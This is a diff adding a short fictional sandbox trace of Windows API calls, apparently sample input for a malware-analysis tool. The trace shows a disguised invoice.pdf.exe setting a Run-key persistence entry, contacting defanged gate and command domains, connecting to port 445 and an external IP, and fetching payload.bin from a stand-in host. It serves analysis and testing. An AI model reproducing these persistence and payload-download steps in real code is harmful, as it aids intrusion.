@@ -1,0 +1,12 @@
+# Sample sandbox API-call trace (fictional) — try it with: zuhan extract / zuhan scan -dump
+[sandbox] pid=4412 image=C:\Users\victim\AppData\Local\Temp\invoice.pdf.exe
+CreateFileW("C:\\Windows\\System32\\kernel32.dll") -> 0x1a4
+LoadLibraryA("ws2_32.dll")
+RegSetValueExW(HKCU\Software\Microsoft\Windows\CurrentVersion\Run, "upd", "C:\\ProgramData\\upd.exe")
+InternetOpenUrlA(hInternet, "hxxp://update-check[.]xyz/gate.php?id=42", NULL, 0, 0x84000000, 0)
+getaddrinfo("cdn.bad-domain.top") -> 185.220.101[.]1
+connect(socket=0x2c, ip=192.168.1.10, port=445)
+connect(socket=0x30, ip=45.9.148.114, port=443)
+WriteFile(dropped="C:\\ProgramData\\stage2.bin", md5=44d88612fea8a8f36de82e1278abb02f)
+HttpSendRequestA(headers="Host: 127.0.0.1\r\nUser-Agent: Mozilla/5.0")
+{"api":"WinHttpConnect","server":"https:\/\/evil.example.ru\/payload.bin","port":443}
